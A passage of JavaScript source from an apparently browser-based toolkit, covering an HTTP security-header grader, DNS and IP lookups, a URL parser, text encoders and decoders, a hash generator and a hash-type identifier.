      const pct = grade === 'A+' ? 100 : Math.round((presentCount / checks.length) * 100);
      bar.style.width = pct + '%';
      bar.className = 'grade-bar-fill grade-bar-' + gradeKey;

      // ===== Grade 2: Hardening & Hygiene (info leaks + cookie flags) =====
      const issues = leakCount + cookieMissCount;
      let grade2;
      if (issues === 0) grade2 = 'A';
      else if (issues <= 3) grade2 = 'B';
      else grade2 = 'C';
      const labels2 = {
        'A':  'Clean - no leaks or weak cookies',
        'B':  'Good - minor hygiene issues',
        'C':  'Poor - multiple leaks / weak cookies',
      };
      const grade2Key = grade2 === 'A+' ? 'Aplus' : grade2;
      const g2 = $('#hdr-grade2');
      g2.textContent = grade2;
      g2.className = 'grade-letter grade-' + grade2Key;
      $('#hdr-grade2-label').textContent = labels2[grade2];
      const issueLabel = issues === 0 ? 'No issues found'
        : `${issues} issue${issues > 1 ? 's' : ''} (${leakCount} leak${leakCount === 1 ? '' : 's'}, ${cookieMissCount} cookie flag${cookieMissCount === 1 ? '' : 's'})`;
      $('#hdr-grade2-score').textContent = issueLabel;
      const bar2 = $('#hdr-grade2-bar');
      const pct2 = Math.max(0, 100 - issues * 12);
      bar2.style.width = pct2 + '%';
      bar2.className = 'grade-bar-fill grade-bar-' + grade2Key;

      $('#hdr-grade-card').style.display = 'block';

      $('#hdr-results').style.display = 'block';

      // ===== Recommendations =====
      const recsContainer = $('#hdr-recs');
      const recsCard = $('#hdr-recs-card');
      const recsToggle = $('#hdr-recs-toggle');
      if (issuesList.length === 0) {
        recsCard.style.display = 'none';
      } else {
        recsContainer.innerHTML = issuesList
          .map(i => RECS[i.key] ? renderRec(i.title, i.status, RECS[i.key]) : '')
          .join('');
        $('#hdr-recs-count').textContent = `(${issuesList.length} issue${issuesList.length > 1 ? 's' : ''})`;
        recsContainer.style.display = 'none';
        recsToggle.textContent = 'Show More Info';
        recsCard.style.display = 'block';
      }
    });

    // Toggle handler (set once)
    $('#hdr-recs-toggle').addEventListener('click', () => {
      const c = $('#hdr-recs');
      const visible = c.style.display !== 'none';
      c.style.display = visible ? 'none' : 'block';
      $('#hdr-recs-toggle').textContent = visible ? 'Show More Info' : 'Hide More Info';
    });

    // ===== Fetch from URL (experimental) =====
    // Uses api.hackertarget.com/httpheaders which returns the raw HTTP response
    // headers as plain text and supports CORS. We then drop the result into the
    // existing textarea and trigger the existing analyze flow - so if this
    // experimental fetch breaks, the manual paste path is untouched.
    const setStatus = (msg, isErr) => {
      const el = $('#hdr-fetch-status');
      el.textContent = msg;
      el.style.color = isErr ? 'var(--danger)' : 'var(--text-mute)';
    };

    $('#hdr-fetch').addEventListener('click', async () => {
      const raw = $('#hdr-url').value.trim();
      if (!raw) return setStatus('Enter a domain or URL', true);

      // Normalize: strip scheme, strip path, keep just host (hackertarget wants a host)
      let target = raw.replace(/^https?:\/\//i, '').replace(/\/.*$/, '').trim();
      if (!target) return setStatus('Invalid URL', true);

      setStatus(`Fetching headers for ${target}...`);
      const btn = $('#hdr-fetch');
      btn.disabled = true;
      try {
        const r = await fetch(`https://api.hackertarget.com/httpheaders/?q=${encodeURIComponent(target)}`);
        if (!r.ok) throw new Error('HTTP ' + r.status);
        const text = (await r.text()).trim();
        if (!text || /error|api count exceeded|invalid/i.test(text.split('\n')[0])) {
          throw new Error(text || 'No headers returned');
        }
        $('#hdr-input').value = text;
        setStatus(`Fetched ${text.split(/\r?\n/).length} lines - analyzing...`);
        $('#hdr-analyze').click();
      } catch (e) {
        setStatus('Fetch failed: ' + e.message + ' - paste the headers manually below', true);
      } finally {
        btn.disabled = false;
      }
    });
  }
};

// ===== 6. DNS LOOKUP =====
TOOLS['dns-lookup'] = {
  title: 'DNS Lookup',
  desc: 'Query DNS records via Cloudflare DNS-over-HTTPS',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">DNS Query</div>
          <div class="field-row">
            <div class="field">
              <label>Domain</label>
              <input type="text" id="dns-domain" placeholder="example.com">
            </div>
            <div class="field">
              <label>Record Type</label>
              <select id="dns-type">
                <option>A</option><option>AAAA</option><option>CNAME</option>
                <option>MX</option><option>TXT</option><option>NS</option>
                <option>SOA</option><option>CAA</option><option>SRV</option><option>PTR</option>
                <option value="ALL">ALL</option>
              </select>
            </div>
          </div>
          <button class="btn" id="dns-lookup">Lookup</button>
        </div>
        <div class="card" id="dns-results" style="display:none">
          <div class="result-header"><h4>Records</h4></div>
          <div class="result-box" id="dns-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    const lookup = async (domain, type) => {
      const r = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=${type}`, {
        headers: { 'Accept': 'application/dns-json' }
      });
      return r.json();
    };
    $('#dns-lookup').addEventListener('click', async () => {
      const d = $('#dns-domain').value.trim();
      const t = $('#dns-type').value;
      if (!d) return toast('Enter a domain');
      const out = $('#dns-output');
      out.textContent = 'Querying...';
      $('#dns-results').style.display = 'block';

      try {
        const types = t === 'ALL' ? ['A','AAAA','CNAME','MX','TXT','NS','SOA','CAA'] : [t];
        const results = {};
        for (const tp of types) {
          const data = await lookup(d, tp);
          if (data.Answer) results[tp] = data.Answer;
        }
        let str = '';
        Object.entries(results).forEach(([tp, recs]) => {
          str += `=== ${tp} ===\n`;
          recs.forEach(r => str += `  ${r.name}  ${r.TTL}  ${r.data}\n`);
          str += '\n';
        });
        out.textContent = str || 'No records found.';
      } catch (e) {
        out.textContent = 'Error: ' + e.message;
      }
    });
  }
};

// ===== 7. URL PARSER =====
TOOLS['url-parser'] = {
  title: 'URL Parser',
  desc: 'Parse and decompose a URL into its components',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">URL</div>
          <div class="field">
            <input type="text" id="up-input" placeholder="https://user:pass@example.com:8080/path?key=value#frag">
          </div>
          <button class="btn" id="up-parse">Parse</button>
        </div>
        <div class="card" id="up-results" style="display:none">
          <div class="card-title">Components</div>
          <dl class="info-grid" id="up-output"></dl>
        </div>
      </div>
    `;
  },
  init() {
    $('#up-parse').addEventListener('click', () => {
      const v = $('#up-input').value.trim();
      if (!v) return toast('Enter a URL');
      try {
        const u = new URL(v);
        const out = $('#up-output');
        const parts = {
          'Protocol': u.protocol,
          'Username': u.username || '(none)',
          'Password': u.password || '(none)',
          'Hostname': u.hostname,
          'Port': u.port || '(default)',
          'Pathname': u.pathname,
          'Search': u.search || '(none)',
          'Hash': u.hash || '(none)',
          'Origin': u.origin,
        };
        out.innerHTML = '';
        Object.entries(parts).forEach(([k, val]) => {
          out.innerHTML += `<dt>${k}</dt><dd>${escapeHtml(val)}</dd>`;
        });
        if (u.search) {
          const params = new URLSearchParams(u.search);
          out.innerHTML += `<dt style="grid-column:1/-1;margin-top:8px;color:var(--accent)">Query Parameters</dt>`;
          for (const [k, val] of params) {
            out.innerHTML += `<dt>${escapeHtml(k)}</dt><dd>${escapeHtml(val)}</dd>`;
          }
        }
        $('#up-results').style.display = 'block';
      } catch (e) {
        toast('Invalid URL');
      }
    });
  }
};

// ===== 8. IP / DOMAIN INFO =====
TOOLS['ip-info'] = {
  title: 'IP / Domain Info',
  desc: 'Get geolocation and ASN info for an IP or domain',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Target</div>
          <div class="field">
            <label>IP address or domain</label>
            <input type="text" id="ipi-input" placeholder="8.8.8.8 or example.com">
          </div>
          <button class="btn" id="ipi-lookup">Lookup</button>
        </div>
        <div class="card" id="ipi-results" style="display:none">
          <div class="card-title">Info</div>
          <dl class="info-grid" id="ipi-output"></dl>
        </div>
      </div>
    `;
  },
  init() {
    // If user passes a domain, resolve it via Cloudflare DoH first.
    const resolveToIp = async (host) => {
      if (/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(host) || host.includes(':')) return host;
      const r = await fetch(`https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(host)}&type=A`, {
        headers: { 'Accept': 'application/dns-json' }
      });
      const d = await r.json();
      const a = (d.Answer || []).find(x => x.type === 1);
      if (!a) throw new Error('Could not resolve domain to IP');
      return a.data;
    };

    // Try multiple CORS-friendly providers as fallbacks.
    const providers = [
      {
        name: 'ipapi.co',
        url: ip => `https://ipapi.co/${ip}/json/`,
        parse: d => {
          if (d.error) throw new Error(d.reason || 'lookup failed');
          return {
            'IP': d.ip, 'Version': d.version,
            'Country': d.country_name ? `${d.country_name} (${d.country_code})` : null,
            'Region': d.region, 'City': d.city, 'Postal': d.postal,
            'Latitude': d.latitude, 'Longitude': d.longitude, 'Timezone': d.timezone,
            'ISP': d.org, 'ASN': d.asn,
          };
        }
      },
      {
        name: 'ipwho.is',
        url: ip => `https://ipwho.is/${ip}`,
        parse: d => {
          if (d.success === false) throw new Error(d.message || 'lookup failed');
          return {
            'IP': d.ip, 'Type': d.type,
            'Country': d.country ? `${d.country} (${d.country_code})` : null,
            'Region': d.region, 'City': d.city,
            'Latitude': d.latitude, 'Longitude': d.longitude,
            'Timezone': d.timezone?.id, 'ISP': d.connection?.isp,
            'ASN': d.connection?.asn, 'Org': d.connection?.org,
          };
        }
      },
    ];

    $('#ipi-lookup').addEventListener('click', async () => {
      const v = $('#ipi-input').value.trim();
      if (!v) return toast('Enter an IP or domain');
      const out = $('#ipi-output');
      out.innerHTML = '<dt>Loading...</dt><dd></dd>';
      $('#ipi-results').style.display = 'block';

      let ip;
      try {
        ip = await resolveToIp(v);
      } catch (e) {
        out.innerHTML = `<dt>Error</dt><dd>${escapeHtml(e.message)}</dd>`;
        return;
      }

      let lastErr;
      for (const p of providers) {
        try {
          const r = await fetch(p.url(ip));
          if (!r.ok) throw new Error(`HTTP ${r.status}`);
          const d = await r.json();
          const fields = p.parse(d);
          out.innerHTML = '';
          if (v !== ip) out.innerHTML += `<dt>Resolved</dt><dd>${escapeHtml(v)} → ${escapeHtml(ip)}</dd>`;
          Object.entries(fields).forEach(([k, val]) => {
            if (val != null && val !== '') out.innerHTML += `<dt>${k}</dt><dd>${escapeHtml(String(val))}</dd>`;
          });
          out.innerHTML += `<dt style="color:var(--text-mute)">Source</dt><dd style="color:var(--text-mute)">${p.name}</dd>`;
          return;
        } catch (e) {
          lastErr = e;
        }
      }
      out.innerHTML = `<dt>Error</dt><dd>All providers failed: ${escapeHtml(lastErr?.message || 'unknown')}</dd>`;
    });
  }
};

// ============================================================
// CRYPTOGRAPHY TOOLS
// ============================================================

const encDecTemplate = (id, label) => `
  <div class="tool">
    <div class="card">
      <div class="card-title">${label}</div>
      <div class="field">
        <label>Input</label>
        <textarea id="${id}-input" placeholder="enter text..."></textarea>
      </div>
      <div class="btn-row">
        <button class="btn" id="${id}-encode">Encode</button>
        <button class="btn btn-secondary" id="${id}-decode">Decode</button>
      </div>
    </div>
    <div class="card" id="${id}-results" style="display:none">
      <div class="result-header">
        <h4>Output</h4>
        <button class="btn btn-ghost" id="${id}-copy">Copy</button>
      </div>
      <div class="result-box" id="${id}-output"></div>
    </div>
  </div>
`;

const wireEncDec = (id, encFn, decFn) => {
  const showOut = (text) => {
    $(`#${id}-output`).textContent = text;
    $(`#${id}-results`).style.display = 'block';
  };
  $(`#${id}-encode`).addEventListener('click', () => {
    try { showOut(encFn($(`#${id}-input`).value)); }
    catch (e) { showOut('Error: ' + e.message); }
  });
  $(`#${id}-decode`).addEventListener('click', () => {
    try { showOut(decFn($(`#${id}-input`).value)); }
    catch (e) { showOut('Error: ' + e.message); }
  });
  $(`#${id}-copy`).addEventListener('click', () => copy($(`#${id}-output`).textContent));
};

TOOLS['base64'] = {
  title: 'Base64 Encode/Decode',
  desc: 'Standard Base64 encoding and decoding',
  render: () => encDecTemplate('b64', 'Base64'),
  init: () => wireEncDec('b64',
    s => btoa(unescape(encodeURIComponent(s))),
    s => decodeURIComponent(escape(atob(s.trim())))
  )
};

TOOLS['url-encode'] = {
  title: 'URL Encode/Decode',
  desc: 'Percent-encode and decode URL-safe characters',
  render: () => encDecTemplate('urlc', 'URL Encoding'),
  init: () => wireEncDec('urlc', encodeURIComponent, decodeURIComponent)
};

TOOLS['html-encode'] = {
  title: 'HTML Encode/Decode',
  desc: 'HTML entity encode and decode',
  render: () => encDecTemplate('htm', 'HTML Entities'),
  init: () => wireEncDec('htm',
    s => s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])),
    s => {
      const ta = document.createElement('textarea');
      ta.innerHTML = s;
      return ta.value;
    }
  )
};

TOOLS['hex'] = {
  title: 'Hex Encode/Decode',
  desc: 'Hex encoding and decoding for text',
  render: () => encDecTemplate('hex', 'Hex'),
  init: () => wireEncDec('hex',
    s => Array.from(new TextEncoder().encode(s)).map(b => b.toString(16).padStart(2, '0')).join(''),
    s => {
      const cleaned = s.replace(/[^0-9a-fA-F]/g, '');
      const bytes = new Uint8Array(cleaned.length / 2);
      for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(cleaned.substr(i*2, 2), 16);
      return new TextDecoder().decode(bytes);
    }
  )
};

// ===== BASE32 (RFC 4648) =====
const B32_ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
const base32Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  let bits = '';
  for (const b of bytes) bits += b.toString(2).padStart(8, '0');
  let out = '';
  for (let i = 0; i < bits.length; i += 5) {
    let chunk = bits.slice(i, i + 5);
    if (chunk.length < 5) chunk = chunk.padEnd(5, '0');
    out += B32_ALPHABET[parseInt(chunk, 2)];
  }
  while (out.length % 8) out += '=';
  return out;
};
const base32Decode = (str) => {
  str = str.toUpperCase().replace(/=+$/, '').replace(/\s/g, '');
  let bits = '';
  for (const c of str) {
    const idx = B32_ALPHABET.indexOf(c);
    if (idx === -1) throw new Error('Invalid base32 character: ' + c);
    bits += idx.toString(2).padStart(5, '0');
  }
  const bytes = [];
  for (let i = 0; i + 8 <= bits.length; i += 8) {
    bytes.push(parseInt(bits.slice(i, i + 8), 2));
  }
  return new TextDecoder().decode(new Uint8Array(bytes));
};
TOOLS['base32'] = {
  title: 'Base32 Encode/Decode',
  desc: 'RFC 4648 Base32 encoding (A-Z, 2-7)',
  render: () => encDecTemplate('b32', 'Base32'),
  init: () => wireEncDec('b32', base32Encode, base32Decode),
};

// ===== BASE58 (Bitcoin alphabet) =====
const B58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
const base58Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  if (!bytes.length) return '';
  let n = 0n;
  for (const b of bytes) n = n * 256n + BigInt(b);
  let out = '';
  while (n > 0n) {
    out = B58_ALPHABET[Number(n % 58n)] + out;
    n /= 58n;
  }
  // Preserve leading zero bytes as leading '1's
  for (const b of bytes) { if (b === 0) out = '1' + out; else break; }
  return out;
};
const base58Decode = (str) => {
  str = str.replace(/\s/g, '');
  if (!str) return '';
  let n = 0n;
  for (const c of str) {
    const idx = B58_ALPHABET.indexOf(c);
    if (idx === -1) throw new Error('Invalid base58 character: ' + c);
    n = n * 58n + BigInt(idx);
  }
  const bytes = [];
  while (n > 0n) {
    bytes.unshift(Number(n & 0xffn));
    n >>= 8n;
  }
  // Restore leading zero bytes
  for (const c of str) { if (c === '1') bytes.unshift(0); else break; }
  return new TextDecoder().decode(new Uint8Array(bytes));
};
TOOLS['base58'] = {
  title: 'Base58 Encode/Decode',
  desc: 'Bitcoin-style Base58 (no 0, O, I, l)',
  render: () => encDecTemplate('b58', 'Base58'),
  init: () => wireEncDec('b58', base58Encode, base58Decode),
};

// ===== BASE85 / ASCII85 =====
const base85Encode = (str) => {
  const bytes = new TextEncoder().encode(str);
  let out = '';
  for (let i = 0; i < bytes.length; i += 4) {
    const chunk = bytes.slice(i, i + 4);
    const padding = 4 - chunk.length;
    let n = 0;
    for (let j = 0; j < 4; j++) n = n * 256 + (chunk[j] || 0);
    if (n === 0 && padding === 0) { out += 'z'; continue; }
    let group = '';
    for (let j = 0; j < 5; j++) {
      group = String.fromCharCode((n % 85) + 33) + group;
      n = Math.floor(n / 85);
    }
    out += group.slice(0, 5 - padding);
  }
  return out;
};
const base85Decode = (str) => {
  str = str.replace(/\s/g, '').replace(/^<~|~>$/g, '');
  // expand z → !!!!!
  str = str.replace(/z/g, '!!!!!');
  const bytes = [];
  for (let i = 0; i < str.length; i += 5) {
    const chunk = str.slice(i, i + 5);
    const padding = 5 - chunk.length;
    let n = 0;
    for (let j = 0; j < 5; j++) {
      const c = j < chunk.length ? chunk.charCodeAt(j) : 'u'.charCodeAt(0);
      const v = c - 33;
      if (v < 0 || v > 84) throw new Error('Invalid base85 character');
      n = n * 85 + v;
    }
    for (let j = 3; j >= 0; j--) bytes.push((n >>> (j * 8)) & 0xff);
    for (let j = 0; j < padding; j++) bytes.pop();
  }
  return new TextDecoder().decode(new Uint8Array(bytes));
};
TOOLS['base85'] = {
  title: 'Base85 / ASCII85',
  desc: 'Adobe ASCII85 encoding (used in PDFs, common in CTFs)',
  render: () => encDecTemplate('b85', 'Base85 / ASCII85'),
  init: () => wireEncDec('b85', base85Encode, base85Decode),
};

// ===== BINARY =====
const binaryEncode = (str) =>
  Array.from(new TextEncoder().encode(str))
    .map(b => b.toString(2).padStart(8, '0'))
    .join(' ');
const binaryDecode = (str) => {
  const bits = str.replace(/[^01]/g, '');
  if (bits.length % 8) throw new Error('Bit length not a multiple of 8');
  const bytes = [];
  for (let i = 0; i < bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i + 8), 2));
  return new TextDecoder().decode(new Uint8Array(bytes));
};
TOOLS['binary'] = {
  title: 'Binary Encode/Decode',
  desc: 'Convert text to/from 8-bit binary',
  render: () => encDecTemplate('bin', 'Binary'),
  init: () => wireEncDec('bin', binaryEncode, binaryDecode),
};

// ===== MORSE CODE =====
const MORSE = {
  A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',
  K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',
  U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',
  '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-',
  '5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',
  '.':'.-.-.-',',':'--..--','?':'..--..',"'":'.----.','!':'-.-.--',
  '/':'-..-.','(':'-.--.',')':'-.--.-','&':'.-...',':':'---...',
  ';':'-.-.-.','=':'-...-','+':'.-.-.','-':'-....-','_':'..--.-',
  '"':'.-..-.','$':'...-..-','@':'.--.-.',
};
const MORSE_REV = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
const morseEncode = (s) =>
  s.toUpperCase().split('').map(c => {
    if (c === ' ') return '/';
    if (c === '\n') return '\n';
    return MORSE[c] || '';
  }).filter(Boolean).join(' ');
const morseDecode = (s) =>
  s.split(/(\s+)/).map(token => {
    if (/^\s+$/.test(token)) return token.includes('\n') ? '\n' : '';
    if (token === '/') return ' ';
    return MORSE_REV[token] || '';
  }).join('').replace(/\s+/g, ' ').trim();
TOOLS['morse'] = {
  title: 'Morse Code',
  desc: 'Encode/decode International Morse Code (use / for word separator)',
  render: () => encDecTemplate('morse', 'Morse Code'),
  init: () => wireEncDec('morse', morseEncode, morseDecode),
};

// ===== HASH GENERATOR =====
TOOLS['hash'] = {
  title: 'Hash Generator',
  desc: 'Generate MD5, SHA-1, SHA-256, SHA-512, and other hashes',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Input</div>
          <div class="field">
            <textarea id="hash-input" placeholder="enter text..."></textarea>
          </div>
          <button class="btn" id="hash-gen">Generate Hashes</button>
        </div>
        <div class="card" id="hash-results" style="display:none">
          <div class="card-title">Hashes</div>
          <div id="hash-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    $('#hash-gen').addEventListener('click', () => {
      const txt = $('#hash-input').value;
      const algos = ['MD5', 'SHA1', 'SHA224', 'SHA256', 'SHA384', 'SHA512', 'SHA3', 'RIPEMD160'];
      const out = $('#hash-output');
      out.innerHTML = '';
      algos.forEach(a => {
        try {
          const h = CryptoJS[a](txt).toString();
          const row = el('div', { class: 'header-row' });
          row.innerHTML = `<span class="h-name">${a}</span><span class="h-detail mono" style="font-family:'JetBrains Mono',monospace;color:var(--text)">${escapeHtml(h)}</span>`;
          const btn = el('button', { class: 'btn btn-ghost', onclick: () => copy(h) }, 'Copy');
          row.appendChild(btn);
          out.appendChild(row);
        } catch {}
      });
      $('#hash-results').style.display = 'block';
    });
  }
};

// ===== HASH IDENTIFIER =====
TOOLS['hash-id'] = {
  title: 'Hash Identifier',
  desc: 'Identify hash type by length, character set, and format',
  render() {
    return `
      <div class="tool">
        <div class="card">
          <div class="card-title">Hash</div>
          <div class="field">
            <textarea id="hid-input" rows="3" placeholder="paste hash here (e.g. 5d41402abc4b2a76b9719d911017c592)"></textarea>
          </div>
          <div class="btn-row">
            <button class="btn" id="hid-id">Identify</button>
            <button class="btn btn-secondary" id="hid-clear">Clear</button>
          </div>
        </div>
        <div class="card" id="hid-results" style="display:none">
          <div class="card-title">Hash Information</div>
          <dl class="info-grid" id="hid-info"></dl>
          <div class="rec-section-label" style="margin-top:18px">Possible Hash Types</div>
          <div class="payload-list" id="hid-output"></div>
        </div>
      </div>
    `;
  },
  init() {
    // ===== Comprehensive hash signature database =====
    // hex(n)  → exactly n hex chars
    // re      → custom regex
    // likely  → most probable interpretation for that length
    const hex = (n) => new RegExp(`^[a-f0-9]{${n}}$`, 'i');
    const SIGS = [
      // ----- 4 -----
      { re: hex(4),  name: 'CRC-16' },
      { re: hex(4),  name: 'CRC-16-CCITT' },
      { re: hex(4),  name: 'FCS-16' },

      // ----- 8 -----
      { re: hex(8),  name: 'CRC-32', likely: true },
      { re: hex(8),  name: 'CRC-32B' },
      { re: hex(8),  name: 'Adler-32' },
      { re: hex(8),  name: 'XOR-32' },
      { re: hex(8),  name: 'FCS-32' },
      { re: hex(8),  name: 'GHash-32-3' },
      { re: hex(8),  name: 'GHash-32-5' },

      // ----- 13 -----
      { re: /^[./0-9A-Za-z]{13}$/, name: 'DES (Unix)', likely: true },
      { re: /^[./0-9A-Za-z]{13}$/, name: 'Traditional DES' },

      // ----- 16 -----
      { re: hex(16), name: 'MySQL323', likely: true },
      { re: hex(16), name: 'DES (Oracle)' },
      { re: hex(16), name: 'Half MD5' },
      { re: hex(16), name: 'Oracle 7-10g' },
      { re: hex(16), name: 'CRC-64' },

      // ----- 32 -----
      { re: hex(32), name: 'MD5', likely: true },
      { re: hex(32), name: 'NTLM', likely: true },
      { re: hex(32), name: 'MD4' },
      { re: hex(32), name: 'MD2' },
      { re: hex(32), name: 'LM' },
      { re: hex(32), name: 'RIPEMD-128' },
      { re: hex(32), name: 'Haval-128' },
      { re: hex(32), name: 'Tiger-128' },
      { re: hex(32), name: 'Snefru-128' },
      { re: hex(32), name: 'Skein-256(128)' },
      { re: hex(32), name: 'Skein-512(128)' },
      { re: hex(32), name: 'Lotus Notes/Domino 5' },
      { re: hex(32), name: 'Skype' },
      { re: hex(32), name: 'ZipMonster' },
      { re: hex(32), name: 'PrestaShop' },
      { re: hex(32), name: 'md5(md5($pass))' },
      { re: hex(32), name: 'md5($pass.$salt)' },
      { re: hex(32), name: 'md5($salt.$pass)' },

      // ----- 40 -----
      { re: hex(40), name: 'SHA-1', likely: true },
      { re: hex(40), name: 'MySQL5.x', likely: true },
      { re: hex(40), name: 'RIPEMD-160' },
      { re: hex(40), name: 'Haval-160' },
      { re: hex(40), name: 'Tiger-160' },
      { re: hex(40), name: 'HAS-160' },
      { re: hex(40), name: 'LinkedIn' },
      { re: hex(40), name: 'Skein-256(160)' },
      { re: hex(40), name: 'Skein-512(160)' },
      { re: hex(40), name: 'sha1($pass.$salt)' },
      { re: hex(40), name: 'sha1($salt.$pass)' },

      // ----- 48 -----
      { re: hex(48), name: 'Tiger-192', likely: true },
      { re: hex(48), name: 'Haval-192' },
      { re: hex(48), name: 'OSX v10.4 - v10.6' },

      // ----- 56 -----
      { re: hex(56), name: 'SHA-224', likely: true },
      { re: hex(56), name: 'SHA3-224' },
      { re: hex(56), name: 'Haval-224' },
      { re: hex(56), name: 'Skein-256(224)' },
      { re: hex(56), name: 'Skein-512(224)' },

      // ----- 64 -----
      { re: hex(64), name: 'SHA-256', likely: true },
      { re: hex(64), name: 'SHA3-256' },
      { re: hex(64), name: 'BLAKE2s-256' },
      { re: hex(64), name: 'Haval-256' },
      { re: hex(64), name: 'GOST R 34.11-94' },
      { re: hex(64), name: 'GOST CryptoPro S-Box' },
      { re: hex(64), name: 'Skein-256' },
      { re: hex(64), name: 'Skein-512(256)' },
      { re: hex(64), name: 'Ventrilo' },

      // ----- 80 -----
      { re: hex(80), name: 'RIPEMD-320' },
      { re: hex(80), name: 'Haval-320' },

      // ----- 96 -----
      { re: hex(96), name: 'SHA-384', likely: true },
      { re: hex(96), name: 'SHA3-384' },
      { re: hex(96), name: 'Skein-512(384)' },
      { re: hex(96), name: 'Skein-1024(384)' },

      // ----- 128 -----
      { re: hex(128), name: 'SHA-512', likely: true },
      { re: hex(128), name: 'SHA3-512' },
      { re: hex(128), name: 'BLAKE2b-512' },
      { re: hex(128), name: 'Whirlpool' },
      { re: hex(128), name: 'Skein-512' },
      { re: hex(128), name: 'Skein-1024(512)' },
      { re: hex(128), name: 'Salsa10' },
      { re: hex(128), name: 'Salsa20' },

      // ----- 136 -----
      { re: hex(136), name: 'OSX v10.7' },

      // ----- 256 -----
      { re: hex(256), name: 'Skein-1024' },

      // ----- Format-prefixed (most reliable) -----
      { re: /^\$1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$/, name: 'MD5 Crypt', likely: true },
      { re: /^\$apr1\$[./A-Za-z0-9]{1,8}\$[./A-Za-z0-9]{22}$/, name: 'Apache MD5 (apr1)', likely: true },
      { re: /^\$2[abxy]?\$\d{2}\$[./A-Za-z0-9]{53}$/, name: 'bcrypt', likely: true },
      { re: /^\$5\$(rounds=\d+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{43}$/, name: 'SHA-256 Crypt', likely: true },
      { re: /^\$6\$(rounds=\d+\$)?[./A-Za-z0-9]{1,16}\$[./A-Za-z0-9]{86}$/, name: 'SHA-512 Crypt', likely: true },
      { re: /^\$argon2i\$/, name: 'Argon2i', likely: true },
      { re: /^\$argon2d\$/, name: 'Argon2d', likely: true },
      { re: /^\$argon2id\$/, name: 'Argon2id', likely: true },
      { re: /^\$pbkdf2-sha\d+\$/, name: 'PBKDF2', likely: true },
      { re: /^\$y\$/, name: 'yescrypt', likely: true },
      { re: /^\$7\$/, name: 'scrypt', likely: true },
      { re: /^\$P\$[./A-Za-z0-9]{31}$/, name: 'phpass (Wordpress / phpBB3)', likely: true },
      { re: /^\$H\$[./A-Za-z0-9]{31}$/, name: 'phpass (Wordpress)', likely: true },
      { re: /^\{SHA\}/, name: 'LDAP {SHA}', likely: true },
      { re: /^\{SSHA\}/, name: 'LDAP {SSHA}', likely: true },
      { re: /^\{MD5\}/, name: 'LDAP {MD5}', likely: true },
      { re: /^\{SMD5\}/, name: 'LDAP {SMD5}', likely: true },
      { re: /^0x0100[a-f0-9]+$/i, name: 'MSSQL (2005/2008/2012)', likely: true },
      { re: /^\*[A-F0-9]{40}$/i, name: 'MySQL 4.1+', likely: true },
      { re: /^[a-f0-9]{32}:[a-f0-9]+$/i, name: 'md5($pass.$salt) - salted', likely: true },
      { re: /^[a-f0-9]{40}:[a-f0-9]+$/i, name: 'sha1($pass.$salt) - salted', likely: true },
      { re: /^[A-Z0-9]{32}:[A-Z0-9]{32}$/i, name: 'LM:NTLM combo' },

      // ----- Base64-encoded common hashes -----
      { re: /^[A-Za-z0-9+/]{27}=$/, name: 'Base64 MD5 (binary)' },
      { re: /^[A-Za-z0-9+/]{43}=$/, name: 'Base64 SHA-256 (binary)' },
      { re: /^[A-Za-z0-9+/]{86}==$/, name: 'Base64 SHA-512 (binary)' },
    ];

    const identify = () => {
      const v = $('#hid-input').value.trim();
      if (!v) return toast('Enter a hash');

      // Build info panel
      const info = $('#hid-info');
      info.innerHTML = '';
      const charset =
        /^[a-f0-9]+$/i.test(v) ? 'Hexadecimal (a-f, 0-9)' :
        /^[A-Za-z0-9+/=]+$/.test(v) ? 'Base64 (A-Z, a-z, 0-9, +/=)' :
        /^[A-Za-z0-9._/$=-]+$/.test(v) ? 'Mixed (likely formatted hash)' :
        'Custom / unknown';
      const fields = {
        'Length': `${v.length} characters`,
        'Character set': charset,
        'Lowercase only': /^[^A-Z]*$/.test(v) ? 'Yes' : 'No',
        'Uppercase only': /^[^a-z]*$/.test(v) ? 'Yes' : 'No',
      };
      Object.entries(fields).forEach(([k, val]) => {
        info.innerHTML += `<dt>${k}</dt><dd>${escapeHtml(val)}</dd>`;
      });

      // Match signatures
      const matches = SIGS.filter(s => s.re.test(v));
      // Sort: likely first
      matches.sort((a, b) => (b.likely ? 1 : 0) - (a.likely ? 1 : 0));

      const out = $('#hid-output');
      out.innerHTML = '';
      if (matches.length === 0) {
        out.innerHTML = `<div class="payload-item" style="color:var(--text-mute)"><code>No known hash type matches this format.</code></div>`;
      } else {
        matches.forEach(m => {
          const item = el('div', { class: 'payload-item' });
          item.innerHTML = `
            <code>${escapeHtml(m.name)}</code>
            ${m.likely ? '<span class="severity-badge sev-low" style="font-size:9px">MOST LIKELY</span>' : ''}
          `;
          out.appendChild(item);
        });
      }
      $('#hid-results').style.display = 'block';
    };

    $('#hid-id').addEventListener('click', identify);
    $('#hid-input').addEventListener('keydown', e => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); identify(); }
    });
